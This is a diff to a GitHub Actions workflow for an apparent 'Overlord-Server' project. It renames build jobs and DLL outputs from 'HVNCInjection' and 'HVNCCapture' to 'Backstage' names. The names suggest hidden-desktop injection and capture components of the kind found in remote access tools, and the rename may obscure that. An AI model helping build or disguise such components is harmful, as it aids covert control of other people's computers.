@@ -11,32 +11,32 @@ env:
   IMAGE_NAME: ${{ github.repository }}
 
 jobs:
-  build-hvnc-dll:
+  build-backstage-dll:
     runs-on: windows-latest
     steps:
       - name: Checkout repository
         uses: actions/checkout@v4
 
-      - name: Build HVNCInjection DLL with MSVC
+      - name: Build BackstageInjection DLL with MSVC
         shell: cmd
-        run: call build-hvnc-dll.bat
+        run: call build-backstage-dll.bat
 
-      - name: Build HVNCCapture DLL with MSVC
+      - name: Build BackstageCapture DLL with MSVC
         shell: cmd
-        run: call build-hvnc-capture-dll.bat
+        run: call build-backstage-capture-dll.bat
 
       - name: Upload HVNC DLLs
         uses: actions/upload-artifact@v4
         with:
           name: hvnc-dll
           path: |
-            Overlord-Server/dist-clients/HVNCInjection.x64.dll
-            Overlord-Server/dist-clients/HVNCCapture.x64.dll
+            Overlord-Server/dist-clients/BackstageInjection.x64.dll
+            Overlord-Server/dist-clients/BackstageCapture.x64.dll
           if-no-files-found: error
           retention-days: 1
 
   build-and-push:
-    needs: build-hvnc-dll
+    needs: build-backstage-dll
     runs-on: ubuntu-latest
     permissions:
       contents: read
